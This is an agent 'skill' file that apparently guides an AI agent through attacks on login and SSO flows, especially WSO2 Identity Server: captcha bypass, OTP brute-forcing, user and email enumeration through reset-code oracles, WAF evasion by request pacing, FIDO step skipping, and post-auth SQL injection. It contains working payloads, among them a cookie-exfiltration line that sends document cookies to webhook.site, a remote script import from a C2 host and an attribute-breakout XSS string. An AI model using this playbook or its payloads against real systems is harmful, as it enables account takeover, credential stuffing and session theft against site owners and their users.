---
name: sso-auth-flow-abuse
description: Use when attacking login/auth flows — captcha bypass, OTP brute-force, WSO2 IS, reset-code enumeration oracles, client-side captcha plugins, Java JSON-RPC dispatchers.
tags: [captcha-bypass, otp, sso, wso2, xss]
version: 1.1.0
author: hermes-curator
license: internal
---

# SSO / Auth-Flow Abuse

## When to use

Load this skill when the target involves any of: a login page with a client-side captcha plugin (jquery.realperson or similar hidden-hash captcha), an OTP verification endpoint the user wants brute-forced, a WSO2 Identity Server (`/commonauth`, `/authenticationendpoint`, `/carbon`, `/oauth2/token` paths), or an XSS sanitizer that rejects whole requests containing `alert(`/`on<event>=` while reflecting canary tags raw.

Class-level patterns for attacking authentication flows: client-side captchas, OTP verification, WSO2 Identity Server 7.x SSO, and XSS sanitizers built on on*-event blocklists. Full detail, payloads, and code live in `references/client-side-captcha-bypass-modern-xss-and-wso2-sso.md`.

## Decision map

| Surface | Signature | Go to |
|---|---|---|
| Client-side captcha plugin (jquery.realperson etc.) | Hidden `*Hash` field computed in JS; server never stores a challenge | §1 of reference |
| OTP brute-force request | OTP page exists; check whether OTP is reachable without a valid password | §3 OTP reality check |
| XSS sanitizer rejects `alert(`/`on<known>=` as a whole request | Canary tag reflects raw but event payloads rejected | §2 of reference |
| WSO2 IS (carbon, /commonauth, /authenticationendpoint) | Any of those paths | §3 of reference |
| F5 ASM block page | `<title>Request Rejected</title>` + Support ID | §4 of reference |

## Core rules (read the reference for details)

1. **Captcha whose server check is computable from client data is bypassable.** Decisive question: does the server remember a challenge it generated? If the plugin submits only a hash of user-typed text, it does not — compute the JS hash offline (emulate 32-bit signed overflow, e.g. realperson seed-1324 rolling hash) and submit any text + matching hash. Verify via the app's error-code oracle (credential error vs captcha error), reproduced with two independent tools (curl + requests).
2. **Lockout discipline:** page JS error maps reveal lockout thresholds (`invalid=9 remaining`, `invalid=10 locked` patterns). Cap ≤4 attempts per real username; stop at the first unexpected response; never drive a real account into lockout (collateral impact).
3. **XSS blocklist filters normalize escapes multi-pass** (decode `\uXXXX`, strip quotes+plus) — escape-splitting of blocked tokens does not survive. Bypass by using events OUTSIDE the blocklist: `oncontentvisibilityautostatechange` (auto-fires with `content-visibility:auto` + off-screen positioning, zero interaction, verified in real browser) or `onbeforematch` (needs find-in-page). Remote exec via `import("//C2/x.js")`; visible PoC via `document.title=` / `document.bgColor=`.
4. **Verify "rendered tags" before claiming XSS** — `<h1>` visible on the page may be `<h1>` encoded text. Check `element.innerHTML`/`children.length` in the browser, or search the raw response for the unencoded string. State explicitly to the user what they are seeing, or they will keep re-asking to retest.
5. **WSO2 sessionDataKey is single-use** — a shared test URL 404s on second use. Mint fresh via the authorize flow; `client_id=CONSOLE` requires PKCE S256 (code_challenge=base64url(sha256(verifier))). Scope entitlement oracle: request `internal_user_mgt_*` scopes and diff the token response's `scope` — strips reveal the user's privilege level without admin API calls.
6. **WSO2 per-endpoint encoding differs — test EACH endpoint.** `login.do` `authenticators` param reflects RAW into the authenticator button HTML (attribute breakout with `BasicAuthenticator:LOCAL;"> <payload>:LOCAL` → IdP-domain XSS during live login flow); `util/modal.jsp` `title`/`description` raw; `email_otp.do` `screenValue` encoded (safe), `sessionDataKey` quotes stripped (safe). Never generalize one endpoint's safety to siblings.
7. **Email OTP is only reachable after a valid username+password POST for an existing user.** Forcing `authenticators=EmailOTP` does not trigger OTP for nonexistent users; no passwordless trigger exists. OTP verify = `POST /commonauth {OTPCode, sessionDataKey, authenticate}` → failure lands on retry.do with a generic message (no error oracle). If you cannot reach an OTP session, state that plainly instead of hammering the endpoint.
8. **F5 ASM recognition:** `<title>Request Rejected</title>` + Support ID, always 200 status with small fixed page — fingerprint by page, not status code. ASM inspects URL paths aggressively but is historically weaker on POST bodies: retest path-blocked payloads in POST bodies before giving up.
9. **Reset-code numeric oracle decodes user AND email existence in one endpoint** — see the full `-1/-2/-3/-10/1/2/69` table in the reference (§5). Differential probes: fake email → `-1` (no user) vs `-2` (user exists); missing user + candidate email → `-3` (EMAIL itself registered); existing user + candidate email → `-10` (both real, unlinked) vs `1/2/69` (match).
10. **Pacing vs parallelism on WAF-fronted targets:** slow sequential (~0.4–0.6s, fresh session per request) ran 30+ requests with zero blocks; 12–15-thread parallelism triggered F5 IP-flood blocking within one batch. Enumerate with paced sequential, not thread pools.
11. **Lockout-dead is a separate finding:** 10 consecutive wrong passwords on a real user with no counter/lockout code appearing = enforcement off even when the UI has handlers for it. Chain: captcha bypass + enum + dead lockout = unbounded stuffing.
12. **Legacy Java JSON-RPC dispatchers** (`POST /<ctx>/RestService?func=<fn>`, body `{"func":fn,"params":[...],"options":[]}` — schema recovered from `jsonrpc.js`/`UIUtil.js`) often carry raw SQL strings in `params` for grid functions; error-shape diffs enumerate func names. Auth-gated now = post-auth SQLi on any single valid account. See reference §6.
13. **Exfiltration PoC chain under a two-layer filter (app sanitizer + F5 ASM):** ASM blocks `document.cookie`, `fetch(`, `eval(`, `atob(`, `Function(`, `<form`, and long base64 literals as REQUEST-level keywords — even in contexts the app sanitizer passes. Working chain: `location="//webhook.site/<token>?c="+document["coo"+"kie"]` (bracket-split defeats the cookie keyword, protocol-relative `//` URL avoids scheme literals, navigation replaces fetch). Verified live: webhook captures all non-HttpOnly cookies. HttpOnly cookies (session tokens) are NOT readable via `document.cookie` but ARE still sent with any same-origin `fetch(..., {credentials:'include'})` — the response body is JS-readable even though the cookie value is not. See reference §8.
14. **Render-context injection needs a compact, quote-free event value.** When the reflection lands inside a server template that splits on spaces (e.g. WSO2 renders `authenticators` into a `data-testid='...'` attribute), any quoted `style="..."` value or spaced event value gets parsed as separate attributes and the payload silently dies. The working form is `style=content-visibility&#58auto` (no quotes, `&#58;` for `:`) with a single-expression event value. If a payload passed the filter but "doesn't run", dump the rendered HTML and check whether your tag survived intact or was attribute-split.
15. **Use `scripts/poc_gen.py` from this skill to mint fresh PoC URLs** — sessionDataKey is single-use, so hand-built test URLs die after one load; the script regenerates the authorize→PKCE→inject chain for any payload.
16. **`authenticators` param is an authentication-flow control, not just an XSS sink** — replacing `BasicAuthenticator:LOCAL;FIDOAuthenticator:LOCAL` with `FIDOAuthenticator:LOCAL` alone and then POSTing username+password to `/commonauth` gets the OAuth code issued WITHOUT the FIDO/Passkey challenge (`id_token.amr=['BasicAuthenticator']` proves the step was skipped). This is CVE-2025-15039 / WSO2-2025-4973 (CVSS 9.4, affects IS 7.2.0). See §11.
17. **When the user asks "which CVE is this", separate misconfiguration from CVE before answering** — check NVD for the product+version and the same vuln CLASS, not just the exact bug. "SP doesn't enforce 2FA" = CWE-306/1188 misconfiguration, no CVE. But "XSS in login flow" may be a variant of a known CVE (e.g. CVE-2024-7103 sub-org login XSS) on a NEWER version — which strengthens the report ("0-day variant on 7.2.0"). Never invent a CVE mapping; cite the class-relative ones you verified.
